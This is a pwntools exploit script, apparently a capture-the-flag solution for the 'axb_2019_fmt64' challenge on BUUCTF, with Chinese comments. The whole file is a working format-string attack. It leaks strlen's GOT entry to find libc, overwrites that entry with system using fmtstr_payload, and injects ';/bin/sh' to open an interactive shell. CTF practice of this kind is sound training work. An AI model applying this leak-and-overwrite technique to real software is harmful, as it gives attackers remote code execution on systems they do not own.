from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 26255
elfpath = './axb_2019_fmt64'
libcpath = ''

if args.LOCAL:
    p = process([elfpath])
    gdb.attach(p, 'b *0x400918\nb *0x400957\nc')
else:
    p = remote(host, port)
    
s = lambda content: p.send(content)
sl = lambda content: p.sendline(content)
r = lambda n: p.recv(n)
ru = lambda pattern: p.recvuntil(pattern)
rl = lambda: p.recvline()
ru7f = lambda: p.recvuntil(b'\x7f')
su = lambda x: p.success(x)
shell = lambda: p.interactive()

# start pwning
# 64位地址存在\x00截断。

e = ELF(elfpath)
ru(b'Please tell me:')
# s(b'a'*7)

# payload1 = f'%{0x4d+6}$p.'.encode()
# payload1 = 'aaaaaaaabbbbbbbb'
payload1 = b'%9$s@@@@'
payload1 += p64(e.got['strlen'])  
s(payload1)
strlen_addr = u64(ru7f()[-6:].ljust(8, b'\x00'))
from LibcSearcher import *
libc = LibcSearcher('strlen', strlen_addr)
libc_base = strlen_addr - libc.dump('strlen')
system_addr = libc_base + libc.dump('system')
# su(hex(libc_base))
# su(hex(strlen_addr))
# su(hex(system_addr))


payload2 = fmtstr_payload(offset = 8, writes={e.got['strlen']: system_addr}, numbwritten=len(b'Repeater:'))
ru(b'Please tell me:')
s(payload2)
ru(b'Please tell me:')

# 这里加分号是因为strlen()的参数是snprintf之后的字符串，所以前面会有个"Repeater:"，加个分号就可以分隔命令，使得system("/bin/sh")被执行
sl(b';/bin/sh\x00')
# sl(b';cat /flag\x00')

shell()

